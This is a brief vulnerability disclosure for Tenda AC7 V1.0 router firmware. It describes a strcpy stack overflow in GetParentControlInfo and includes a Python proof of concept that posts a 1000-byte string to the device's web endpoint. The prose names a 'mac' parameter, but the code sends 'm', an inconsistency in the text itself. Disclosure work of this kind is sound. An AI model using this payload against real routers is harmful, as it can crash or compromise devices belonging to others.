## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

The Tenda  AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `GetParentControlInfo` function. The `mac_addr` variable receives the `mac` parameter from a POST request and is later assigned `pc_info->mac_addr` to by function `strcpy`. However, since the user can control the input of  `mac`, it can cause a stack overflow. The user-provided  `mac` can exceed the capacity of the `pc_info->mac_addr` array, triggering this security vulnerability.

![image-20240318184835919](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318184835919.png)

![image-20240318184824565](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318184824565.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/GetParentControlInfo"
payload = b"a"*1000

data = {"m": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318155045408](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155045408.png)